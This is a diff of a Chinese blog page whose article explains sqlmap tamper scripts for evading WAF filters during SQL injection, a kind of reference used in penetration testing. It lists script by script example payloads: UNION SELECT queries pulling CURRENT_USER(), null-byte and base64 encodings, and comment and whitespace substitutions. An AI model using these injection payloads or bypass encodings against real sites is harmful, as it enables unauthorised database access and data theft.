@@ -1,11 +1,12 @@
 <!DOCTYPE html>
-<html lang=zh>
+<html>
 <head>
-    <meta charset="utf-8">
-    
-    <title>sqlmap注入之tamper绕过WAF防火墙过滤 | Ivan&#39;s Blog</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="每当注入的时候看到这个贱贱的提示框，内心有千万只草泥马在奔腾。
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>sqlmap注入之tamper绕过WAF防火墙过滤 | Ivan&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="每当注入的时候看到这个贱贱的提示框，内心有千万只草泥马在奔腾。
 但很多时候还是得静下来分析过滤系统到底过滤了哪些参数，该如何绕过。
 sqlmap中的tamper给我们带来了很多防过滤的脚本，非常实用，可能有的朋友还不知道怎样才能最有效的利用tamper脚本。
 当然使用脚本之前需要确定的就是系统过滤了哪些关键字，比如单引号、空格、select、union、admin等等。
@@ -34,237 +35,225 @@ sqlmap中的tamper给我们带来了很多防过滤的脚本，非常实用，�
 当然使用脚本之前需要确定的就是系统过滤了哪些关键字，比如单引号、空格、select、union、admin等等。
 所以有的时候我们会发">
 <meta name="twitter:image" content="http://www.vuln.cn/wp-content/uploads/2015/09/tamper.png">
-    
-
-    
-        <link rel="alternate" href="/" title="Ivan&#39;s Blog" type="application/atom+xml" />
-    
-
-    
-
-    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/vendor/open-sans/styles.css">
-    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
-
-    <link rel="stylesheet" href="/css/style.css">
-
-    <script src="/vendor/jquery/2.1.3/jquery.min.js"></script>
-    
-    
-        <link rel="stylesheet" href="/vendor/lightgallery/css/lightgallery.min.css">
-    
-    
-    
-    
-    
-
-
+  
+    <link rel="alternative" href="/atom.xml" title="Ivan&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="//favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
 </head>
 
 <body>
-    <div id="container">
-        <header id="header">
-    <div id="header-main" class="header-inner">
-        <div class="outer">
-            <a href="/" id="logo">
-                <i class="logo"></i>
-                <span class="site-title">Ivan&#39;s Blog</span>
-            </a>
-            <nav id="main-nav">
-                
-                    <a class="main-nav-link" href="/.">Home</a>
-                
-                    <a class="main-nav-link" href="/archives">Archives</a>
-                
-                    <a class="main-nav-link" href="/categories">Categories</a>
-                
-                    <a class="main-nav-link" href="/tags">Tags</a>
-                
-                    <a class="main-nav-link" href="/about">About</a>
-                
-            </nav>
-            
-                
-                <nav id="sub-nav">
-                    <div class="profile" id="profile-nav">
-                        <a id="profile-anchor" href="javascript:;">
-                            <img class="avatar" src="/css/images/avatar.png" />
-                            <i class="fa fa-caret-down"></i>
-                        </a>
-                    </div>
-                </nav>
-            
-            <div id="search-form-wrap">
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="0" class="js-avatar">
+			
+		</a>
 
-    <form class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
-        <button type="submit" class="search-form-submit"></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Ivan</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>Menu</li>
+						<li>Tags</li>
+						
+						<li>Links</li>
+						
+						
+						<li>Über</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="#" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+					        
+								<a class="rss" target="_blank" href="#" title="rss">rss</a>
+					        
+								<a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Kali-转载/" style="font-size: 10px;"> - Kali - 转载</a> <a href="/tags/原创/" style="font-size: 15px;"> - 原创</a> <a href="/tags/原创-Hack/" style="font-size: 20px;"> - 原创 - Hack</a> <a href="/tags/原创-Tool/" style="font-size: 10px;"> - 原创 - Tool</a> <a href="/tags/原创-树莓派/" style="font-size: 10px;"> - 原创 - 树莓派</a> <a href="/tags/树莓派-原创/" style="font-size: 10px;"> - 树莓派 - 原创</a> <a href="/tags/转载-Hack/" style="font-size: 10px;"> - 转载 - Hack</a> <a href="/tags/转载-Tool/" style="font-size: 20px;"> - 转载 - Tool</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">奥巴马的博客</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">卡卡的美丽传说</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">本泽马的博客</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">吉格斯的博客</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">习大大大不同</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">托蒂的博客</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">我是谁，我从哪里来，我到哪里去？我就是我，是颜色不一样的吃货…</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
 </div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(未命名)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '/content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-<script src="/js/insight.js"></script>
 
-</div>
-        </div>
     </div>
-    <div id="main-nav-mobile" class="header-sub header-inner">
-        <table class="menu outer">
-            <tr>
-                
-                    <td><a class="main-nav-link" href="/.">Home</a></td>
-                
-                    <td><a class="main-nav-link" href="/archives">Archives</a></td>
-                
-                    <td><a class="main-nav-link" href="/categories">Categories</a></td>
-                
-                    <td><a class="main-nav-link" href="/tags">Tags</a></td>
-                
-                    <td><a class="main-nav-link" href="/about">About</a></td>
-                
-                <td>
-                    
-    <div class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Ivan</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				
+					<img lazy-src="0" class="js-avatar">
+				
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Ivan</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="#" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+			        
+						<a class="rss" target="_blank" href="#" title="rss">rss</a>
+			        
+						<a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/" class="article-date">
+  	<time datetime="2016-08-05T10:35:41.000Z" itemprop="datePublished">2016-08-05</time>
+</a>
     </div>
-
-                </td>
-            </tr>
-        </table>
-    </div>
-</header>
-
-        <div class="outer">
-            
-                
-
-<aside id="profile">
-    <div class="inner profile-inner">
-        <div class="base-info profile-block">
-            <img id="avatar" src="/css/images/avatar.png" />
-            <h2 id="name">一凡</h2>
-            <h3 id="title">Web 前端 &amp; 网络安全</h3>
-            <span id="location"><i class="fa fa-map-marker"></i>UK</span>
-            <a id="follow" target="_blank" href="https://github.com/yfgeek/">关注我</a>
-        </div>
-        <div class="article-info profile-block">
-            <div class="article-info-block">
-                14
-                <span>文章</span>
-            </div>
-            <div class="article-info-block">
-                8
-                <span>标签</span>
-            </div>
-        </div>
-        
-        <div class="profile-block social-links">
-            <table>
-                <tr>
-                    
-                    
-                    <td>
-                        <a href="http://github.com/yfgeek" target="_blank" title="github" class=tooltip>
-                            <i class="fa fa-github"></i>
-                        </a>
-                    </td>
-                    
-                    <td>
-                        <a href="/" target="_blank" title="twitter" class=tooltip>
-                            <i class="fa fa-twitter"></i>
-                        </a>
-                    </td>
-                    
-                    <td>
-                        <a href="/" target="_blank" title="facebook" class=tooltip>
-                            <i class="fa fa-facebook"></i>
-                        </a>
-                    </td>
-                    
-                    <td>
-                        <a href="/" target="_blank" title="dribbble" class=tooltip>
-                            <i class="fa fa-dribbble"></i>
-                        </a>
-                    </td>
-                    
-                    <td>
-                        <a href="/" target="_blank" title="rss" class=tooltip>
-                            <i class="fa fa-rss"></i>
-                        </a>
-                    </td>
-                    
-                </tr>
-            </table>
-        </div>
-        
-    </div>
-</aside>
-
-            
-            <section id="main"><article id="post-sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu" class="article article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
-        
-        
-            <header class="article-header">
-                
+  
+  <div class="article-inner">
     
-        <h1 class="article-title" itemprop="name">
-            sqlmap注入之tamper绕过WAF防火墙过滤
-        </h1>
+      <input type="hidden" class="isFancy" />
     
-
-                
-                    <div class="article-meta">
-                        
-    <div class="article-date">
-        <i class="fa fa-calendar"></i>
-        <a href="/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/">
-            <time datetime="2016-08-05T10:35:41.000Z" itemprop="datePublished">2016-08-05</time>
-        </a>
-    </div>
-
-
-                        
-                        
-    <div class="article-tag">
-        <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/转载-Hack/"> - 转载 - Hack</a>
-    </div>
-
-                    </div>
-                
-            </header>
+    
+      <header class="article-header">
         
+  
+    <h1 class="article-title" itemprop="name">
+      sqlmap注入之tamper绕过WAF防火墙过滤
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
         
-        <div class="article-entry" itemprop="articleBody">
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/转载-Hack/"> - 转载 - Hack</a></li></ul>
+	</div>
+
         
-            
-            <a id="more"></a> 
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a> 
 <p><img data-url="/content/images/2016/08/wallhaven-131694-2.jpg" class="lazy cover" alt="cover"></p>
 <p></p><p>每当注入的时候看到这个贱贱的提示框，内心有千万只草泥马在奔腾。</p><br><img class="aligncenter size-full wp-image-2087" src="http://www.vuln.cn/wp-content/uploads/2015/09/tamper.png" alt="sqlmap的tamper绕过waf" width="622" height="386"><br><img class="aligncenter size-full wp-image-2088" src="http://www.vuln.cn/wp-content/uploads/2015/09/tamper1.png" alt="sqlmap的tamper绕过waf" width="449" height="289"><p></p>
 <p></p><p>但很多时候还是得静下来分析过滤系统到底过滤了哪些参数，该如何绕过。</p><p></p>
@@ -374,329 +363,141 @@ sqlmap中的tamper给我们带来了很多防过滤的脚本，非常实用，�
 <p><div class="line number4 index3 alt1"><code class="sql plain">*&nbsp;&nbsp; </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</code></div><br><br><br><br><br><br><br></p>
 <p></p><p style="color: #555555;">Requirement:</p><p></p>
 <ul style="color: #555555;"><br><li>MySQL Tested against:</li><br><li>MySQL 4.0, 5.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：apostrophenullencode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：绕过过滤双引号，替换字符和双引号。</p><br><div style="color: #555555;"><br><div id="highlighter_913012" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: tamper(</code><code class="sql string" style="color: blue !important;">“1 AND ‘1’=’1”</code><code class="sql plain">) ‘1 </code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">%00%271%00%27=%00%271’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 4, 5.0 and 5.5</li><br><li>Oracle 10g</li><br><li>PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：halfversionedmorekeywords.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p><br><div style="color: #555555;"><br><div id="highlighter_654010" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">(</code><code class="sql string" style="color: blue !important;">“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">“value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL &lt; 5.1</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 4.0.18, 5.0.22</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2morehash.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：空格替换为 #号 以及更多随机字符串 换行符</p><br><div style="color: #555555;"><br><div id="highlighter_996632" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"><em> Input: 1 </em></code><code class="sql color1" style="color: gray !important;">AND</code> <code class="sql plain">9227=9227 </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"> </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 </code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement: <em> MySQL &gt;= 5.1.13 Tested</em></p><br><p style="color: #555555;">against:  MySQL 5.1.41</p><br><p style="color: #555555;">案例一:<a style="color: #337ab7;" href="http://www.91ri.org/5411.html" target="_blank" rel="external">91ri一篇文章</a></p><br><h2 style="font-weight: 400; color: #555555;">脚本名：appendnullbyte.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：在有效负荷结束位置加载零字节字符编码</p><br><div style="color: #555555;"><br><div id="highlighter_379295" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 1=1’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 AND 1=1%00’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>Microsoft Access</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：ifnull2ifisnull.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</p><br><div style="color: #555555;"><br><div id="highlighter_831787" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example:</code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain">(</code><code class="sql string" style="color: blue !important;">‘IFNULL(1, 2)’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘IF(ISNULL(1),2,1)’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL</li><br><li>SQLite (possibly)</li><br><li>SAP MaxDB (possibly)</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 5.0 and 5.5</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mssqlblank.py(mssql)</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：空格替换为其它空符号</p><br><p style="color: #555555;">Example: <em> Input: SELECT id FROM users </em> Output: SELECT%08id%02FROM%0Fusers</p><br><p style="color: #555555;">Requirement: <em> Microsoft SQL Server Tested against: </em> Microsoft SQL Server 2000 <em> Microsoft SQL Server 2005</em></p><br><h2 style="font-weight: 400; color: #555555;">ASCII table:</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">案例一: wooyun.org/bugs/wooyun-2010-062878</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：base64encode.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用base64编码替换 Example: (“1′ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’ Requirement: all</p><br><p style="color: #555555;">案例一: <a href="http://wooyun.org/bugs/wooyun-2010-060071" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-060071</a></p><br><p style="color: #555555;">案例二: <a href="http://wooyun.org/bugs/wooyun-2010-021062" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-021062</a></p><br><p style="color: #555555;">案例三: <a href="http://wooyun.org/bugs/wooyun-2010-043229" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-043229</a></p><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mssqlhash.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：替换空格</p><br><div style="color: #555555;"><br><div id="highlighter_950809" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1%23%0AAND%23%0A9227=9227’</code> <code class="sql plain">Requirement:  MSSQL <em> MySQL </em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：modsecurityversioned.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：过滤空格，包含完整的查询版本注释</p><br><div style="color: #555555;"><br><div id="highlighter_254956" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 2&gt;1–’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 /!30874AND 2&gt;1<em>/–’</em></code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:  MySQL</p><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 5.0</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mysqlblank.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：空格替换其它空白符号(mysql)</p><br><div style="color: #555555;"><br><div id="highlighter_899158" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br><div class="line number2 index1 alt1">2</div><br><div class="line number3 index2 alt2">3</div><br><div class="line number4 index3 alt1">4</div><br><div class="line number5 index4 alt2">5</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: </code></div><br><div class="line number2 index1 alt1"></div><br><div class="line number3 index2 alt2"><code class="sql plain"><em> Input: </em></code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code> <code class="sql plain">id </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">FROM</code> <code class="sql plain">users </code></div><br><div class="line number4 index3 alt1"></div><br><div class="line number5 index4 alt2"><code class="sql plain"> </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">Output</code><code class="sql plain">: </code><code class="sql keyword" style="font-weight: bold !important; color: #006699 !important;">SELECT</code><code class="sql plain">%0Bid%0BFROM%A0users </code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL</li><br></ul><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 5.1</li><br></ul><br><p style="color: #555555;">案例一:wooyun.org/bugs/wooyun-2010-076735</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：between.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用between替换大于号（&gt;）</p><br><div style="color: #555555;"><br><div id="highlighter_828717" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND A &gt; B–’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 AND A NOT BETWEEN 0 AND B–’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>Microsoft SQL Server 2005</li><br><li>MySQL 4, 5.0 and 5.5 <em> Oracle 10g </em> PostgreSQL 8.3, 8.4, 9.0</li><br></ul><br><p style="color: #555555;">案例一:wooyun.org/bugs/wooyun-2010-068815</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2mysqldash.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p><br><p style="color: #555555;">注：之前有个mssql的 这个是mysql的</p><br><div style="color: #555555;"><br><div id="highlighter_795519" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 AND 9227=9227’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1–%0AAND–%0A9227=9227’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Requirement:</p><br><ul style="color: #555555;"><br><li>MySQL</li><br><li>MSSQL</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：multiplespaces.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：围绕SQL关键字添加多个空格</p><br><div style="color: #555555;"><br><div id="highlighter_398915" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘1 UNION SELECT foobar’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘1 UNION SELECT foobar’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against: all</p><br><p style="color: #555555;">案例一: wooyun.org/bugs/wooyun-2010-072489</p><br><h2 style="font-weight: 400; color: #555555;">脚本名：space2plus.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：用+替换空格</p><br><div style="color: #555555;"><br><div id="highlighter_575586" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘SELECT id FROM users’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘SELECT+id+FROM+users’</code> <code class="sql plain">Tested against: </code><code class="sql color1" style="color: gray !important;">all</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><h2 style="font-weight: 400; color: #555555;">脚本名：bluecoat.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</p><br><div style="color: #555555;"><br><div id="highlighter_759136" class="syntaxhighlighter  sql"><br><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter" style="color: #afafaf !important;"><br><div class="line number1 index0 alt2">1</div><br></td><br><td class="code"><br><div class="container"><br><div class="line number1 index0 alt2"><code class="sql plain">Example: (</code><code class="sql string" style="color: blue !important;">‘SELECT id FROM users where id = 1’</code><code class="sql plain">) </code><code class="sql string" style="color: blue !important;">‘SELECT%09id FROM users where id LIKE 1’</code></div><br></div><br></td><br></tr><br></tbody><br></table><br></div><br></div><br><p style="color: #555555;">Tested against:</p><br><ul style="color: #555555;"><br><li>MySQL 5.1, SGOS</li><br></ul><br><h2 style="font-weight: 400; color: #555555;">脚本名：nonrecursivereplacement.py</h2><br><hr style="color: #555555;"><br><p style="color: #555555;">双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p><br><div style="color: 